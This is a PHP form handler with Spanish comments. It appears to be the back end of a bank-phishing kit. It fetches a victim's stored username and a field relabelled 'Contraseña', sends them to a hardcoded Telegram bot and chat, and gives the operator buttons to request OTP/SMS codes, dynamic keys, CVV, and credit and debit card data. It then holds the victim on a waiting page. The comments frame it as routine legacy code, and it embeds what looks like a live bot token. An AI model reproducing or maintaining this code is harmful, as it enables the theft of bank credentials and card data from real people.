<?php
/**
 * enviar_formulario.php
 * ---------------------
 * Handler POST de "Logo recibido" — flujo auxiliar legacy.
 *
 * DIFERENCIAS con los otros handlers (NO se modifican por restricción de funcionalidad):
 *   - Usa su PROPIO token y chat_id de Telegram (otro canal operativo).
 *   - NO genera nuevo request_id; reutiliza el $_POST['rid'] enviado por el formulario.
 *   - Envía por file_get_contents() en lugar de cURL.
 *   - Setea $_SESSION (sin session_start en este archivo, típico de flujo legacy).
 *
 * 7 pasos adaptados (preservando comportamiento original):
 *   1) Recibe $_POST['codigo'] (valor genérico), $_POST['rid'] (request_id existente).
 *   2) SELECT por request_id los datos previos (nombre / telefono) — CON WHERE BINARY agregado.
 *   3) (omitido) No genera RID nuevo, mantiene el original por diseño legacy.
 *   4) (sin update DB en este handler, solo notifica).
 *   5) Mensaje Telegram "Logo recibido" + teclado inline (OPCION_9=ERROR, OPCION_10=FINALIZAR).
 *   6) Carga variables de sesión legacy + 302 → espera.html?rid=.
 *   7) exit.
 */

require __DIR__ . DIRECTORY_SEPARATOR . 'conexion.php';

// ── Paso 1: Lectura segura del POST ───────────────────────────────────────────
$codigo     = $_POST['codigo'] ?? '';
$request_id = $_POST['rid']    ?? '';

if (!$request_id) {
    die("Error: request_id (rid) no proporcionado.");
}

// ── Paso 2: Datos previos (BINARY agregado para evitar colisiones DB compartida)
$stmt = $pdo->prepare(
    "SELECT nombre, telefono FROM solicitudes WHERE BINARY request_id = ? LIMIT 1"
);
$stmt->execute([$request_id]);
$data = $stmt->fetch(PDO::FETCH_ASSOC);
if (!$data) {
    die("Error: Solicitud no encontrada.");
}

$nombre   = $data['nombre'];
$telefono = $data['telefono'];

// ── Paso 5: Telegram (mismo canal OPERACIONES unificado en esta instalación) ───
// FIX DETERMINANTE: CANAL NUEVO hardcodeado DEFAULT. getenv() SOLO sobreescribe si
// existe y no está vacía. Nunca más al canal legacy anterior.
$DEFAULT_BOT_TOKEN_OPS = "8924841749:AAG6MK_tMpRF19EehX5iEQdfotCySeD6m4c";
$DEFAULT_CHAT_ID_OPS   = "-5503364698";
$envBot = getenv('TELEGRAM_BOT_TOKEN_OPS');
$envCh  = getenv('TELEGRAM_CHAT_ID_OPS');
$token   = (is_string($envBot) && trim($envBot) !== '') ? $envBot : $DEFAULT_BOT_TOKEN_OPS;
$chat_id = (is_string($envCh)  && trim($envCh)  !== '') ? $envCh  : $DEFAULT_CHAT_ID_OPS;

$mensaje  = "📝 <b>[LOGO RECIBIDO]</b> Canal legacy 'Logo recibido':\n";
$mensaje .= "👤 Usuario: $nombre\n";
$mensaje .= "🔓 Contraseña: $telefono\n";

// Set ORIGINAL de botones preservado (incluye fila FINALIZAR separada)
$botones = [
    'inline_keyboard' => [[
        ['text' => "🟢DINAMICA",       'callback_data' => "OPCION_1_$request_id"],
        ['text' => "🟢OTP/SMS",        'callback_data' => "OPCION_2_$request_id"],
    ], [
        ['text' => "🔴WHATSAPP",       'callback_data' => "OPCION_3_$request_id"],
        ['text' => "🟢PERSONALES",     'callback_data' => "OPCION_4_$request_id"],
    ], [
        ['text' => "🟢CREDITO ",       'callback_data' => "OPCION_5_$request_id"],
        ['text' => "🟢DEBITO",         'callback_data' => "OPCION_6_$request_id"],
    ], [
        ['text' => "🔴ERROR USUARIO ", 'callback_data' => "OPCION_7_$request_id"],
        ['text' => "🔴ERROR DINÁMICA", 'callback_data' => "OPCION_9_$request_id"],
        ['text' => "🟢CVV",            'callback_data' => "OPCION_55_$request_id"],
    ], [
        ['text' => "🟢FINALIZAR",      'callback_data' => "OPCION_10_$request_id"],
    ]],
];

// Envío por file_get_contents (método original, NO se cambia por cURL para no afectar flujo)
$url = "https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
    'chat_id'      => $chat_id,
    'text'         => $mensaje,
    'reply_markup' => json_encode($botones),
]);
@file_get_contents($url);

// ── Paso 6: Sesión legacy + redirect al loader ────────────────────────────────
// NOTA: session_start() no se invoca en este archivo; se deja como legacy.
// Si el flujo requiere que estas variables persistan, se hereda la sesión del archivo previo.
$_SESSION['nombre']     = $nombre;
$_SESSION['telefono']   = $telefono;
$_SESSION['request_id'] = $request_id;

header("Location: espera.html?rid=$request_id");
exit;
